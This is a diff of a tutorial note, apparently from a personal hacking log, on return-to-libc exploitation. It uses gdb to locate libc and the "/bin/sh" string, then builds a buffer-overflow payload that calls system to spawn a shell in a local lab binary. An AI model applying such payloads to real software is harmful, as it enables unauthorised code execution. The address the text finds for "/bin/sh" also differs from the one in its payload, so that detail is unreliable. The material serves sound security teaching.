@@ -1,5 +1,10 @@
 # Overwriting the RIP/EIP
 
+dependencies:
+	(Buffer Overflow)[../buffer_overflow/buffer_overflow.md]
+	(Layout)[../../elf/layout.md]
+	(Compilation)[../../elf/compilation.md]
+
 sources:
 https://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html \
 https://stackoverflow.com/questions/44938745/rodata-section-loaded-in-executable-page \
@@ -299,7 +304,44 @@ saved EBP (pushed `impossible_shell`) |
 Lower Addresses (Top of the stack) |
 
 As you can see, if we write the address of "/bin/sh" to 'garbage value2'
-it will be used as an argument to `system`:
+it will be used as an argument to `system`. To find the address of
+"/bin/sh", we can use the command `info proc map` in `gdb` (in a break)
+to get the location in memory where `libc` was loadded to:
+
+```
+(gdb) info proc map
+process 6820
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/felipe/uff/inmetro/hacking_log/rop/rip/rip
+	 0x8049000  0x804a000     0x1000        0x0 /home/felipe/uff/inmetro/hacking_log/rop/rip/rip
+	 0x804a000  0x804b000     0x1000     0x1000 /home/felipe/uff/inmetro/hacking_log/rop/rip/rip
+	0xf7df8000 0xf7df9000     0x1000        0x0 
+	0xf7df9000 0xf7fa9000   0x1b0000        0x0 /lib/i386-linux-gnu/libc-2.23.so
+	0xf7fa9000 0xf7fab000     0x2000   0x1af000 /lib/i386-linux-gnu/libc-2.23.so
+	0xf7fab000 0xf7fac000     0x1000   0x1b1000 /lib/i386-linux-gnu/libc-2.23.so
+	0xf7fac000 0xf7faf000     0x3000        0x0 
+	0xf7fd3000 0xf7fd4000     0x1000        0x0 
+	0xf7fd4000 0xf7fd7000     0x3000        0x0 [vvar]
+	0xf7fd7000 0xf7fd9000     0x2000        0x0 [vdso]
+	0xf7fd9000 0xf7ffc000    0x23000        0x0 /lib/i386-linux-gnu/ld-2.23.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x22000 /lib/i386-linux-gnu/ld-2.23.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x23000 /lib/i386-linux-gnu/ld-2.23.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+
+```
+
+We can now use the command `find` to search for the string between
+the first and last addresses:
+
+```
+(gdb) find 0xf7df8000, 0xf7fac000, "/bin/sh"
+0xf7f54a0b
+1 pattern found.
+```
+
+And finally add the address to our payload:
 
 ```
 ./rip `python3 -c "__import__('sys').stdout.buffer.write(b'A'*0x18 + b'BBBB' + b'\x50\x68\xe3\xf7' + b'CCCC' + b'\xc8\x97\xf5\xf7')"`
